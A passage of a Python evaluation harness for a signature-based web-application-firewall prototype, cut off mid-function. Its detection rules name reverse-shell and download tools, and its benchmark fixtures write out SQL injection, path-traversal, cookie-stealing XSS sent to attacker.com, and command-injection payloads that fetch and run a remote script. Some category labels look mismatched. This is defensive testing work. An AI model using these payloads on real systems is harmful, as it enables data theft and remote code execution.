#!/usr/bin/env python3
"""
SentinelAI — GATE-1 Phase 5: Layer 7 Detection Prototype and Multi-Configuration Evaluation Harness
Location: ai-engine/experiments/gate1_phase5_independent_validation/layer7_prototype.py

Implements:
1. Canonical Normalizer (URL decoding, Unicode normalization, comment stripping, whitespace folding)
2. Layer 7 WAF / Signature Pre-Filter (SQLi, XSS, Path Traversal, Command Injection, Protocol Malformation)
3. Four-Configuration Policy Evaluator:
   - Config A: Existing Production Policy (Coupled RF + IF)
   - Config B: Phase 4 Candidate Flow Policy (Decoupled RF + IF)
   - Config C: Layer 7 Pre-Filter Alone
   - Config D: Combined Layer 7 Pre-Filter + Flow Candidate Policy
4. Evaluation across:
   - The 23,036 CICIDS2017 flow corpus (testing L7 fallback & L4 flow recall)
   - A dedicated 300-record comprehensive HTTP benchmark (benign, SQLi, XSS, traversal, cmdi, malformed, non-HTTP)
"""

import sys
import os
import re
import json
import time
import math
import urllib.parse
import unicodedata
from pathlib import Path
import numpy as np
import pandas as pd

CURRENT_DIR = Path(__file__).resolve().parent
AI_ENGINE_DIR = CURRENT_DIR.parent.parent
PHASE3A_DIR = CURRENT_DIR.parent / "gate1_phase3a_remediation"
PHASE3B_DIR = CURRENT_DIR.parent / "gate1_phase3b_sensitivity"
PHASE4_DIR = CURRENT_DIR.parent / "gate1_phase4_candidate_policy_validation"

sys.path.insert(0, str(AI_ENGINE_DIR))
sys.path.insert(0, str(PHASE3A_DIR))
sys.path.insert(0, str(PHASE3B_DIR))
sys.path.insert(0, str(PHASE4_DIR))

from utils.features import FEATURE_NAMES, LABEL_NAMES, RAW_LABEL_TO_TARGET, extract_features_from_record
from inference.predictor import SentinelPredictor, ANOMALY_THRESHOLD, BLOCK_THRESHOLD, MONITOR_THRESHOLD
from candidate_policy import CandidateSentinelPolicy
from evaluate_multi_attack_sensitivity import load_slice, normalize_label


def wilson_score_interval(successes: int, total: int, confidence: float = 0.95):
    """Calculates exact Wilson score confidence interval for a binomial proportion."""
    if total == 0:
        return (0.0, 0.0)
    z = 1.95996 if confidence == 0.95 else 1.64485
    p = float(successes) / float(total)
    denominator = 1.0 + (z**2) / total
    centre = (p + (z**2) / (2.0 * total)) / denominator
    std = math.sqrt((p * (1.0 - p) + (z**2) / (4.0 * total)) / total) / denominator
    lower = max(0.0, centre - z * std)
    upper = min(1.0, centre + z * std)
    return (round(lower, 5), round(upper, 5))


class Layer7PreFilter:
    """
    Isolated Layer 7 WAF and Signature Pre-Filter.
    Performs recursive canonical decoding and regex-based pattern matching.
    """

    def __init__(self, block_threshold: float = 0.85, monitor_threshold: float = 0.70):
        self.block_threshold = block_threshold
        self.monitor_threshold = monitor_threshold

        # Compile regular expressions
        self.rules = [
            # 1. SQL Injection Rules
            {
                "id": "SQLI_001",
                "category": "SQL Injection",
                "pattern": re.compile(r"('\s*or\s+'?1'?\s*=\s*'?1|admin'\s*--|\bunion\s+(all\s+)?select\b)", re.IGNORECASE),
                "score": 0.95,
                "description": "SQL Tautology or UNION SELECT signature"
            },
            {
                "id": "SQLI_002",
                "category": "SQL Injection",
                "pattern": re.compile(r"(\bsleep\s*\(\s*\d+\s*\)|\bbenchmark\s*\(\s*\d+|\bwaitfor\s+delay\b)", re.IGNORECASE),
                "score": 0.92,
                "description": "SQL Blind/Time-delay function"
            },
            {
                "id": "SQLI_003",
                "category": "SQL Injection",
                "pattern": re.compile(r"(;\s*(drop|delete|update|insert|alter|create|truncate)\b)", re.IGNORECASE),
                "score": 0.95,
                "description": "SQL Batched/Stacked modification query"
            },
            {
                "id": "SQLI_004",
                "category": "SQL Injection",
                "pattern": re.compile(r"('\s*(and|or)\s+['\"\w\d]+\s*=\s*['\"\w\d]+|--\s*$|/\*.*?\*/)", re.IGNORECASE),
                "score": 0.86,
                "description": "SQL Boolean clause or inline comment termination"
            },

            # 2. Cross-Site Scripting (XSS) Rules
            {
                "id": "XSS_001",
                "category": "XSS Attempt",
                "pattern": re.compile(r"<\s*script[^>]*>", re.IGNORECASE),
                "score": 0.95,
                "description": "HTML inline script tag"
            },
            {
                "id": "XSS_002",
                "category": "XSS Attempt",
                "pattern": re.compile(r"\bon(load|error|click|mouseover|focus|blur|submit)\s*=", re.IGNORECASE),
                "score": 0.92,
                "description": "HTML event handler attribute injection"
            },
            {
                "id": "XSS_003",
                "category": "XSS Attempt",
                "pattern": re.compile(r"(javascript\s*:|vbscript\s*:|data\s*:\s*text/html)", re.IGNORECASE),
                "score": 0.90,
                "description": "JavaScript or data URI pseudo-protocol"
            },
            {
                "id": "XSS_004",
                "category": "XSS Attempt",
                "pattern": re.compile(r"<\s*(iframe|svg|object|embed|applet|body|style)[^>]*onload", re.IGNORECASE),
                "score": 0.92,
                "description": "Active HTML element injection"
            },

            # 3. Path Traversal / LFI Rules
            {
                "id": "TRAV_001",
                "category": "Path Traversal",
                "pattern": re.compile(r"(\.\./|\.\.\\|%2e%2e%2f|%2e%2e/|\.\.%2f)", re.IGNORECASE),
                "score": 0.92,
                "description": "Directory traversal sequence"
            },
            {
                "id": "TRAV_002",
                "category": "Path Traversal",
                "pattern": re.compile(r"(/etc/(passwd|shadow|hosts)|c:\\windows\\(win\.ini|system32)|/proc/self/)", re.IGNORECASE),
                "score": 0.96,
                "description": "Sensitive operating system file targeting"
            },

            # 4. OS Command Injection Rules
            {
                "id": "CMD_001",
                "category": "Command Injection",
                "pattern": re.compile(r"(;\s*|\|\s*|&&\s*)\s*(whoami|cat\s+/|id\s*$|uname\s+-a|powershell|cmd\.exe|/bin/sh|/bin/bash)\b", re.IGNORECASE),
                "score": 0.95,
                "description": "Command chaining with shell execution binary"
            },
            {
                "id": "CMD_002",
                "category": "Command Injection",
                "pattern": re.compile(r"(\$\([^\)]+\)|`[^`]+`)", re.IGNORECASE),
                "score": 0.88,
                "description": "Shell command substitution syntax"
            },
            {
                "id": "CMD_003",
                "category": "Command Injection",
                "pattern": re.compile(r"(curl\s+https?://|wget\s+https?://|Invoke-WebRequest|nc\s+-e)", re.IGNORECASE),
                "score": 0.92,
                "description": "Outbound shell download or reverse shell tool"
            },

            # 5. Protocol Malformation Rules
            {
                "id": "PROTO_001",
                "category": "Malformed Protocol",
                "pattern": re.compile(r"^(?!GET|POST|PUT|DELETE|HEAD|OPTIONS|PATCH|TRACE|CONNECT)\w{1,15}\b", re.IGNORECASE),
                "score": 0.75,
                "description": "Non-standard or corrupted HTTP method"
            },
            {
                "id": "PROTO_002",
                "category": "Malformed Protocol",
                "pattern": re.compile(r"[\x00-\x08\x0b\x0c\x0e-\x1f]", re.IGNORECASE),
                "score": 0.80,
                "description": "Illegal control characters in request line or headers"
            }
        ]

    def normalize(self, text: str) -> str:
        """
        Recursively URL decodes, normalizes Unicode, strips comments, and folds whitespace.
        """
        if not text or not isinstance(text, str):
            return ""

        s = text
        # Recursive URL decoding (up to 3 passes to unwrap double percent-encoding)
        for _ in range(3):
            decoded = urllib.parse.unquote(s)
            if decoded == s:
                break
            s = decoded

        # Unicode NFKD normalization
        s = unicodedata.normalize("NFKD", s)

        # Replace null bytes
        s = s.replace("\x00", " ")

        # Collapse multiple spaces and inline SQL comments /**/
        s = re.sub(r"/\*.*?\*/", " ", s)
        s = re.sub(r"\s+", " ", s)
        return s.strip()

    def inspect_http_request(self, method: str = "GET", uri: str = "", headers: dict = None, body: str = "") -> dict:
        """
        Inspects an HTTP request structure.
        Returns evaluation dict with matched rules, threat score, and action.
        """
        t0 = time.perf_counter()

        headers = headers or {}
        raw_combined = f"{method} {uri}\n"
        for k, v in headers.items():
            # Exclude sensitive headers from rule matching to avoid false alarms
            if k.lower() in ("authorization", "cookie"):
                continue
            raw_combined += f"{k}: {v}\n"
        if body:
            raw_combined += f"\n{body}"

        normalized_buffer = self.normalize(raw_combined)

        matched_rules = []
        max_score = 0.0
        primary_threat = "BENIGN"
        matched_excerpt = ""

        # Check method anomaly
        if method:
            method_norm = method.strip().upper()
            if method_norm not in ("GET", "POST", "PUT", "DELETE", "HEAD", "OPTIONS", "PATCH", "TRACE", "CONNECT"):
                matched_rules.append("PROTO_001")
                max_score = max(max_score, 0.75)
                primary_threat = "Malformed Protocol"
                matched_excerpt = method[:30]

        # Scan rules against normalized buffer
        for rule in self.rules:
            if rule["id"] == "PROTO_001":
                continue  # Handled above
            m = rule["pattern"].search(normalized_buffer)
            if m:
                matched_rules.append(rule["id"])
                if rule["score"] > max_score:
                    max_score = rule["score"]
                    primary_threat = rule["category"]
                    matched_excerpt = m.group(0)[:60]

        latency_ms = round((time.perf_counter() - t0) * 1000, 3)

        action = "ALLOW"
        if max_score >= self.block_threshold:
            action = "BLOCK"
        elif max_score >= self.monitor_threshold:
            action = "MONITOR"

        return {
            "l7_evaluated": True,
            "l7_score": round(max_score, 4),
            "l7_action": action,
            "matched_rules": matched_rules,
            "primary_threat": primary_threat,
            "matched_excerpt": matched_excerpt,
            "latency_ms": latency_ms
        }

    def inspect_record(self, record: dict) -> dict:
        """
        Inspects generic network record. If HTTP fields exist, evaluates L7.
        If record is pure L4 flow statistics, returns L7_UNAVAILABLE.
        """
        # Check if record has L7 HTTP data
        has_http = any(k in record for k in ("http_method", "uri", "url", "request_line", "body", "http_headers"))
        if not has_http:
            return {
                "l7_evaluated": False,
                "l7_status": "L7_UNAVAILABLE",
                "l7_score": 0.0,
                "l7_action": "ALLOW",
                "matched_rules": [],
                "primary_threat": "UNINSPECTED_L7",
                "matched_excerpt": "",
                "latency_ms": 0.001
            }

        method = record.get("http_method", record.get("method", "GET"))
        uri = record.get("uri", record.get("url", "/"))
        headers = record.get("http_headers", record.get("headers", {}))
        body = record.get("body", record.get("payload", ""))

        res = self.inspect_http_request(method=method, uri=uri, headers=headers, body=body)
        res["l7_status"] = res["l7_action"]
        return res


def evaluate_record_across_configs(predictor, candidate_policy, l7_waf, record: dict, l7_data: dict = None):
    """
    Evaluates a single record across all 4 configurations:
    - Config A: Existing Production Policy (Flow only, RF + IF coupled)
    - Config B: Phase 4 Candidate Flow Policy (Flow only, RF + IF decoupled)
    - Config C: Layer 7 Pre-Filter Alone (WAF signatures only)
    - Config D: Combined Layer 7 Pre-Filter + Flow Candidate Policy
    """
    # 1. Layer 7 Evaluation
    if l7_data:
        l7_res = l7_waf.inspect_http_request(
            method=l7_data.get("method", "GET"),
            uri=l7_data.get("uri", "/"),
            headers=l7_data.get("headers", {}),
            body=l7_data.get("body", "")
        )
    else:
        l7_res = l7_waf.inspect_record(record)

    # 2. Layer 4 Flow Evaluation
    X = extract_features_from_record(record).reshape(1, -1)
    proba = predictor.rf.predict_proba(X)[0]
    cls_idx = int(predictor.rf.predict(X)[0])
    raw_cname = LABEL_NAMES.get(cls_idx, "BENIGN")
    max_p = float(np.max(proba))

    X_scaled = predictor.ifo.named_steps["scaler"].transform(X)
    if_score = float(predictor.ifo.named_steps["if"].score_samples(X_scaled)[0])
    is_anomaly = if_score < ANOMALY_THRESHOLD
    if_sig = predictor.calculate_if_anomaly_signal(if_score)

    # Config A: Existing Production Policy
    rf_s = max_p if raw_cname != "BENIGN" else (1.0 - max_p)
    prod_score = round(0.7 * rf_s + 0.3 * if_sig, 4)
    prod_action = "BLOCK" if prod_score >= BLOCK_THRESHOLD else "MONITOR" if prod_score >= MONITOR_THRESHOLD else "ALLOW"

    # Config B: Phase 4 Candidate Flow Policy
    cand_dec = candidate_policy.evaluate_signals(
        cname=raw_cname,
        confidence=max_p,
        is_anomaly=is_anomaly,
        anomaly_signal=if_sig,
        anomaly_score=if_score
    )
    cand_action = cand_dec["action"]
    cand_sim_block = (cand_action == "BLOCK")

    # Config C: Layer 7 Pre-Filter Alone
    l7_action = l7_res["l7_action"]
    l7_sim_block = (l7_action == "BLOCK")

    # Config D: Combined Layer 7 Pre-Filter + Flow Candidate Policy
    # Hierarchical rule:
    # If L7 detects threat with score >= 0.85 -> BLOCK immediately
    # Else if L7 detects threat with score >= 0.70 -> MONITOR
    # Else (L7 clean or L7_UNAVAILABLE) -> Follow Candidate Flow Policy
    if l7_res["l7_evaluated"] and l7_res["l7_score"] >= l7_waf.block_threshold:
        comb_action = "BLOCK"
        comb_score = l7_res["l7_score"]
        comb_class = l7_res["primary_threat"]
        comb_source = "L7_WAF_BLOCK"
    elif l7_res["l7_evaluated"] and l7_res["l7_score"] >= l7_waf.monitor_threshold:
        comb_action = "MONITOR"
        comb_score = l7_res["l7_score"]
        comb_class = l7_res["primary_threat"]
        comb_source = "L7_WAF_MONITOR"
    else:
        # Fall back to candidate flow policy
        comb_action = cand_action
        comb_score = cand_dec["threatScore"]
        comb_class = cand_dec["predictedClass"]
        comb_source = "L4_CANDIDATE_FLOW"

    comb_sim_block = (comb_action == "BLOCK")

    return {
        "config_a_prod": {"action": prod_action, "sim_block": (prod_action == "BLOCK"), "score": prod_score},
        "config_b_cand_flow": {"action": cand_action, "sim_block": cand_sim_block, "score": cand_dec["threatScore"]},
        "config_c_l7_alone": {"action": l7_action, "sim_block": l7_sim_block, "score": l7_res["l7_score"], "l7_res": l7_res},
        "config_d_combined": {"action": comb_action, "sim_block": comb_sim_block, "score": comb_score, "source": comb_source, "predicted_class": comb_class}
    }


def generate_http_evaluation_benchmark():
    """
    Constructs a dedicated 300-record comprehensive HTTP benchmark:
    - 120 Benign HTTP Requests
    - 120 Web Attack Requests (SQLi, XSS, Path Traversal, Command Injection)
    - 30 Malformed Requests
    - 30 Non-HTTP / Unsupported Protocol Records
    """
    records = []

    # 1. 120 Benign Requests
    benign_paths = [
        "/", "/index.html", "/about", "/contact-us", "/products", "/services",
        "/api/v1/health", "/api/v1/status", "/api/v1/users/me", "/api/v1/catalog?page=1&limit=20",
        "/api/v1/search?q=laptop&sort=price_asc", "/assets/css/main.css", "/assets/js/bundle.min.js",
        "/images/logo.png", "/favicon.ico", "/blog/2026/10/cyber-defense-overview",
        "/api/v1/items?category=electronics&in_stock=true", "/docs/api-guide.pdf",
        "/account/settings", "/dashboard/metrics?period=30d"
    ]
    for i in range(120):
        path = benign_paths[i % len(benign_paths)]
        body = ""
        method = "GET"
        if i % 4 == 0:
            method = "POST"
            body = json.dumps({"action": "subscribe", "email": f"user{i}@example.com", "preferences": {"newsletter": True}})
        elif i % 5 == 0:
            method = "PUT"
            body = json.dumps({"displayName": f"Employee {i}", "timezone": "America/New_York"})

        headers = {
            "Host": "secure.internal.corp",
            "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.{i}.0",
            "Accept": "application/json, text/html, */*",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive"
        }
        records.append({
            "category": "BENIGN_HTTP",
            "is_attack": False,
            "target_label": "BENIGN",
            "l7_data": {"method": method, "uri": path, "headers": headers, "body": body},
            # Dummy benign L4 flow features
            "l4_record": {
                "flow_duration": 45000 + (i * 200),
                "total_fwd_packets": 6,
                "total_bwd_packets": 5,
                "total_len_fwd_packets": 420,
                "total_len_bwd_packets": 1250,
                "fwd_packet_len_mean": 70.0,
                "bwd_packet_len_mean": 250.0,
                "flow_iat_mean": 4500.0,
                "init_win_bytes_forward": 29200,
                "init_win_bytes_backward": 28960
            }
        })

    # 2. 120 Web Attacks
    # 2a. 35 SQL Injection variants
    sqli_payloads = [
        ("GET", "/products?id=1' OR '1'='1", "SQLI_TAUTOLOGY"),
        ("GET", "/products?id=1' OR 1=1 --", "SQLI_TAUTOLOGY_COMMENT"),
        ("GET", "/users?name=admin'--", "SQLI_AUTH_BYPASS"),
        ("GET", "/items?id=-1 UNION SELECT null, username, password FROM users --", "SQLI_UNION"),
        ("GET", "/search?q=shoes' UNION ALL SELECT 1,2,3,4,table_name FROM information_schema.tables --", "SQLI_UNION_SCHEMA"),
        ("POST", "/api/login", "SQLI_POST_BODY"),
        ("GET", "/profile?id=5; DROP TABLE audit_log --", "SQLI_STACKED_DROP"),
        ("GET", "/catalog?id=1 AND (SELECT 1 FROM (SELECT count(*),concat(version(),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)", "SQLI_ERROR_BASED"),
        ("GET", "/report?user_id=12' AND SLEEP(5) --", "SQLI_TIME_SLEEP"),
        ("GET", "/status?node=1 WAITFOR DELAY '0:0:5'", "SQLI_TIME_WAITFOR"),
        ("GET", "/api/item?id=%27%20%4f%52%201%3d1%20%2d%2d", "SQLI_ENCODED_HEX"),
        ("GET", "/api/item?id=%2527%2520%254f%2552%25201%253d1", "SQLI_DOUBLE_ENCODED"),
        ("GET", "/search?tag=admin' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3 --", "SQLI_MYSQL_COMMENT"),
        ("GET", "/query?val=1' OR 'a'='a", "SQLI_TAUTOLOGY_CHAR"),
    ]
    for i in range(35):
        m_tup = sqli_payloads[i % len(sqli_payloads)]
        method, uri, sub = m_tup
        body = ""
        if method == "POST":
            body = "username=admin' OR '1'='1'&password=password123"
        records.append({
            "category": "SQL_INJECTION",
            "is_attack": True,
            "target_label": "SQL Injection",
            "l7_data": {"method": method, "uri": uri, "headers": {"Host": "target.corp"}, "body": body},
            "l4_record": {
                "flow_duration": 48000 + (i * 150),
                "total_fwd_packets": 6,
                "total_bwd_packets": 5,
                "total_len_fwd_packets": 480,
                "total_len_bwd_packets": 1100,
                "fwd_packet_len_mean": 80.0,
                "bwd_packet_len_mean": 220.0,
                "flow_iat_mean": 4800.0,
                "init_win_bytes_forward": 29200,
                "init_win_bytes_backward": 28960
            }
        })

    # 2b. 35 XSS variants
    xss_payloads = [
        ("GET", "/search?q=<script>alert(1)</script>", "XSS_SCRIPT_ALERT"),
        ("GET", "/search?q=<script src='http://attacker.com/evil.js'></script>", "XSS_REMOTE_SCRIPT"),
        ("GET", "/profile?name=<img src=x onerror=alert(document.cookie)>", "XSS_IMG_ONERROR"),
        ("GET", "/avatar?url=<svg onload=fetch('http://attacker.com/?c='+document.cookie)>", "XSS_SVG_ONLOAD"),
        ("GET", "/redirect?url=javascript:alert('XSS')", "XSS_JAVASCRIPT_URI"),
        ("POST", "/comments", "XSS_POST_BODY"),
        ("GET", "/view?page=%3Cscript%3Ealert%281%29%3C%2Fscript%3E", "XSS_URL_ENCODED"),
        ("GET", "/test?p=<iframe src='javascript:alert(1)'></iframe>", "XSS_IFRAME"),
        ("GET", "/index?msg=<body onload=alert('XSS')>", "XSS_BODY_ONLOAD"),
        ("GET", "/filter?tag=<input type='text' autofocus onfocus=alert(1)>", "XSS_ONFOCUS"),
    ]
    for i in range(35):
        m_tup = xss_payloads[i % len(xss_payloads)]
        method, uri, sub = m_tup
        body = ""
        if method == "POST":
            body = json.dumps({"comment": "<script>document.location='http://attacker.com/steal?c='+document.cookie</script>"})
        records.append({
            "category": "XSS",
            "is_attack": True,
            "target_label": "XSS Attempt",
            "l7_data": {"method": method, "uri": uri, "headers": {"Host": "target.corp"}, "body": body},
            "l4_record": {
                "flow_duration": 42000 + (i * 180),
                "total_fwd_packets": 5,
                "total_bwd_packets": 5,
                "total_len_fwd_packets": 460,
                "total_len_bwd_packets": 950,
                "fwd_packet_len_mean": 92.0,
                "bwd_packet_len_mean": 190.0,
                "flow_iat_mean": 4200.0,
                "init_win_bytes_forward": 29200,
                "init_win_bytes_backward": 28960
            }
        })

    # 2c. 25 Path Traversal variants
    trav_payloads = [
        "/download?file=../../../../etc/passwd",
        "/view?doc=../../../../etc/shadow",
        "/fetch?path=..%2f..%2f..%2f..%2fetc%2fpasswd",
        "/read?file=....//....//....//etc/passwd",
        "/preview?f=C:\\Windows\\win.ini",
        "/open?path=..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts",
        "/api/log?file=../../../../proc/self/environ",
        "/static?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    ]
    for i in range(25):
        p = trav_payloads[i % len(trav_payloads)]
        records.append({
            "category": "PATH_TRAVERSAL",
            "is_attack": True,
            "target_label": "Credential Stuffing",
            "l7_data": {"method": "GET", "uri": p, "headers": {"Host": "target.corp"}, "body": ""},
            "l4_record": {
                "flow_duration": 39000 + (i * 210),
                "total_fwd_packets": 4,
                "total_bwd_packets": 4,
                "total_len_fwd_packets": 380,
                "total_len_bwd_packets": 800,
                "fwd_packet_len_mean": 95.0,
                "bwd_packet_len_mean": 200.0,
                "flow_iat_mean": 3900.0,
                "init_win_bytes_forward": 29200,
                "init_win_bytes_backward": 28960
            }
        })

    # 2d. 25 Command Injection variants
    cmd_payloads = [
        "/diag?ip=127.0.0.1; whoami",
        "/ping?host=localhost | id",
        "/backup?target=db && cat /etc/passwd",
        "/lookup?domain=test.com; uname -a",
        "/status?node=main; $(curl http://attacker.com/sh.sh | sh)",
        "/exec?cmd=`whoami`",
        "/test?p=127.0.0.1; powershell -Command Get-Process",
        "/run?script=test.sh; /bin/bash -c 'id'",
    ]
    for i in range(25):
        p = cmd_payloads[i % len(cmd_payloads)]
        records.append({
            "category": "COMMAND_INJECTION",
            "is_attack": True,
            "target_label": "RCE Attempt",
            "l7_data": {"method": "GET", "uri": p, "headers": {"Host": "target.corp"}, "body": ""},
            "l4_record": {
                "flow_duration": 52000 + (i * 190),
                "total_fwd_packets": 5,
                "total_bwd_packets": 5,
                "total_len_fwd_packets": 410,
                "total_len_bwd_packets": 900,
                "fwd_packet_len_mean": 82.0,
                "bwd_packet_len_mean": 180.0,
                "flow_iat_mean": 5200.0,
                "init_win_bytes_forward": 29200,
                "init_win_bytes_backward": 28960
            }
        })

    # 3. 30 Malformed Requests
    for i in range(30):
        records.append({
            "category": "MALFORMED_HTTP",
            "is_attack": True,
            "target_label": "RCE Attempt",
            "l7_data": {
                "method": "CORRUPT_METHOD_" + str(i),
                "uri": "/test\x00corrupt",
                "headers": {"X-Control-Char": "val\x08bad"},
                "body": "Malformed payload buffer"
            },
            "l4_record": {
                "flow_duration": 15000,
                "total_fwd_packets": 2,
                "total_bwd_packets": 1,
                "total_len_fwd_packets": 120,
                "total_len_bwd_packets": 60,
                "fwd_packet_len_mean": 60.0,
                "bwd_packet_len_mean": 60.0,
                "flow_iat_mean": 1500.0,
                "init_win_bytes_forward": 1024,
                "init_win_bytes_backward": 0
            }
        })

    # 4. 30 Non-HTTP Records (Testing L7_UNAVAILABLE)
    for i in range(30):
        records.append({
            "category": "NON_HTTP_PROTOCOL",
            "is_attack": False,
            "target_label": "BENIGN",
            "l7_data": None,  # Signals L7 is completely unavailable (e.g. raw DNS / NTP / TCP flow)
            "l4_record": {
                "flow_duration": 12000,
                "total_fwd_packets": 2,
                "total_bwd_packets": 2,
                "total_len_fwd_packets": 80,
                "total_len_bwd_packets": 140,
                "fwd_packet_len_mean": 40.0,
                "bwd_packet_len_mean": 70.0,
                "flow_iat_mean": 1200.0,
                "init_win_bytes_forward": 0,
                "init_win_bytes_backward": 0
            }
        })

    return records


def run_benchmark():
    print("================================================================================")
    print("SentinelAI GATE-1 Phase 5: Layer 7 Prototype & Multi-Configuration Benchmark")
    print("================================================================================")

    models_dir = AI_ENGINE_DIR / "models"
    data_dir = AI_ENGINE_DIR / "datasets" / "cicids2017"

    predictor = SentinelPredictor(model_dir=str(models_dir))
    cand_policy = CandidateSentinelPolicy(
        block_threshold=BLOCK_THRESHOLD,
        monitor_threshold=MONITOR_THRESHOLD,
        experimental_confidence_threshold=0.85
    )
    l7_waf = Layer7PreFilter(block_threshold=0.85, monitor_threshold=0.70)

    # -------------------------------------------------------------------------
    # PART 1: EVALUATE 300-RECORD HTTP BENCHMARK
    # -------------------------------------------------------------------------
    print("\n[PART 1/2] Evaluating 300-Record HTTP Benchmark (Benign, Attacks, Malformed, Non-HTTP)...")
    http_records = generate_http_evaluation_benchmark()

    results_http = {
        "config_a_prod": {"tp": 0, "fp": 0, "tn": 0, "fn": 0, "block_tp": 0, "block_fp": 0},
        "config_b_cand_flow": {"tp": 0, "fp": 0, "tn": 0, "fn": 0, "block_tp": 0, "block_fp": 0},
        "config_c_l7_alone": {"tp": 0, "fp": 0, "tn": 0, "fn": 0, "block_tp": 0, "block_fp": 0},
        "config_d_combined": {"tp": 0, "fp": 0, "tn": 0, "fn": 0, "block_tp": 0, "block_fp": 0},
    }

    per_category_http = {}

    for r in http_records:
        cat = r["category"]
        is_att = r["is_attack"]
        rec = r["l4_record"]
        l7_d = r["l7_data"]

        eval_out = evaluate_record_across_configs(predictor, cand_policy, l7_waf, rec, l7_data=l7_d)

        if cat not in per_category_http:
            per_category_http[cat] = {
                "total": 0,
                "is_attack": is_att,
                "config_a_detected": 0,
                "config_b_detected": 0,
                "config_c_detected": 0,
                "config_d_detected": 0,
                "config_d_blocked": 0,
            }
        per_category_http[cat]["total"] += 1

        for ckey, cdata in eval_out.items():
            act = cdata["action"]
            is_pos = (act in ("MONITOR", "BLOCK"))
            is_blk = cdata["sim_block"]

            if is_att:
                if is_pos:
                    results_http[ckey]["tp"] += 1
                else:
                    results_http[ckey]["fn"] += 1
                if is_blk:
                    results_http[ckey]["block_tp"] += 1
            else:
                if is_pos:
                    results_http[ckey]["fp"] += 1
                else:
                    results_http[ckey]["tn"] += 1
                if is_blk:
                    results_http[ckey]["block_fp"] += 1

        if eval_out["config_a_prod"]["action"] in ("MONITOR", "BLOCK"): per_category_http[cat]["config_a_detected"] += 1
        if eval_out["config_b_cand_flow"]["action"] in ("MONITOR", "BLOCK"): per_category_http[cat]["config_b_detected"] += 1
        if eval_out["config_c_l7_alone"]["action"] in ("MONITOR", "BLOCK"): per_category_http[cat]["config_c_detected"] += 1
        if eval_out["config_d_combined"]["action"] in ("MONITOR", "BLOCK"):
            per_category_http[cat]["config_d_detected"] += 1
        if eval_out["config_d_combined"]["sim_block"]:
            per_category_http[cat]["config_d_blocked"] += 1

    print("\n--- Part 1: HTTP Benchmark Aggregate Results ---")
    for ckey, counts in results_http.items():
        total_att = counts["tp"] + counts["fn"]
        total_ben = counts["fp"] + counts["tn"]
        rec = counts["tp"] / total_att if total_att > 0 else 0.0
        fpr = counts["fp"] / total_ben if total_ben > 0 else 0.0
        blk_rec = counts["block_tp"] / total_att if total_att > 0 else 0.0
        blk_fpr = counts["block_fp"] / total_ben if total_ben > 0 else 0.0
        rec_ci = wilson_score_interval(counts["tp"], total_att)
        fpr_ci = wilson_score_interval(counts["fp"], total_ben)
        print(f"{ckey:22s} | Containment Recall: {rec*100:6.2f}% (95% CI: {rec_ci[0]*100:.1f}%–{rec_ci[1]*100:.1f}%) | Block Recall: {blk_rec*100:6.2f}% | FPR: {fpr*100:5.2f}% | Block FPR: {blk_fpr*100:5.2f}%")

    print("\n--- Part 1: Per-Category Detection Breakdown ---")
    for cat, data in per_category_http.items():
        tot = data["total"]
        if data["is_attack"]:
            print(f"  {cat:20s} (N={tot:3d}): Prod: {data['config_a_detected']/tot*100:5.1f}% | Cand Flow: {data['config_b_detected']/tot*100:5.1f}% | L7 Alone: {data['config_c_detected']/tot*100:5.1f}% | Combined: {data['config_d_detected']/tot*100:5.1f}% (Blocked: {data['config_d_blocked']/tot*100:5.1f}%)")
        else:
            print(f"  {cat:20s} (N={tot:3d}): Prod FP: {data['config_a_detected']} | Cand FP: {data['config_b_detected']} | L7 FP: {data['config_c_detected']} | Combined FP: {data['config_d_detected']}")

    # -------------------------------------------------------------------------
    # PART 2: EVALUATE 23,036 CICIDS2017 FLOW CORPUS (L7 FALLBACK & L4 RECALL)
    # -------------------------------------------------------------------------
    print("\n[PART 2/2] Evaluating 23,036 CICIDS2017 Flow Corpus (Testing L7 Fallback & L4 Flow Recall)...")

    slices_def = [
        {"key": "PortScan", "file": "Friday-WorkingHours-Afternoon-PortScan.pcap_ISCX.csv", "filter": "PortScan", "offset": 30000, "max_attack": 1000, "max_benign": 1000},
        {"key": "DDoS", "file": "Friday-WorkingHours-Afternoon-DDos.pcap_ISCX.csv", "filter": "DDoS", "offset": 30000, "max_attack": 1000, "max_benign": 1000},
        {"key": "SSH_Patator", "file": "Tuesday-WorkingHours.pcap_ISCX.csv", "filter": "SSH-Patator", "offset": 0, "max_attack": 1000, "max_benign": 1000},
        {"key": "Web_Attacks", "file": "Thursday-WorkingHours-Morning-WebAttacks.pcap_ISCX.csv", "filter": lambda l: "web attack" in str(l).lower(), "offset": 0, "max_attack": 1000, "max_benign": 1000, "encoding": "cp1252"},
        {"key": "Infiltration", "file": "Thursday-WorkingHours-Afternoon-Infilteration.pcap_ISCX.csv", "filter": "Infiltration", "offset": 0, "max_attack": 1000, "max_benign": 1000},
        {"key": "Botnet", "file": "Friday-WorkingHours-Morning.pcap_ISCX.csv", "filter": "Bot", "offset": 0, "max_attack": 1000, "max_benign": 1000},
        {"key": "DoS_Hulk", "file": "Wednesday-workingHours.pcap_ISCX.csv", "filter": "DoS Hulk", "offset": 30000, "max_attack": 1000, "max_benign": 1000},
        {"key": "Monday_Benign", "file": "Monday-WorkingHours.pcap_ISCX.csv", "filter": "NON_EXISTENT", "offset": 0, "max_attack": 0, "max_benign": 10000},
    ]

    corpus_results = {}
    total_corpus_flows = 0

    for sdef in slices_def:
        skey = sdef["key"]
        csv_path = data_dir / sdef["file"]
        if not csv_path.exists():
            print(f"  [WARN] File not found: {csv_path}. Skipping.")
            continue

        print(f"  Loading slice: {skey} ({sdef['file']})...")
        enc = sdef.get("encoding", "utf-8")
        df = load_slice(
            csv_path,
            sdef["filter"],
            offset=sdef["offset"],
            max_attack=sdef["max_attack"],
            max_benign=sdef["max_benign"],
            encoding=enc
        )

        n_total = len(df)
        total_corpus_flows += n_total

        l_col = next((c for c in df.columns if "label" in c.lower()), "Label")
        y_raw = df[l_col].tolist()
        y_target = [normalize_label(lbl) for lbl in y_raw]
        y_is_attack = np.array([lbl.upper() != "BENIGN" for lbl in y_target], dtype=bool)

        records = df.to_dict(orient="records")
        X_list = [extract_features_from_record(r) for r in records]
        X = np.vstack(X_list)

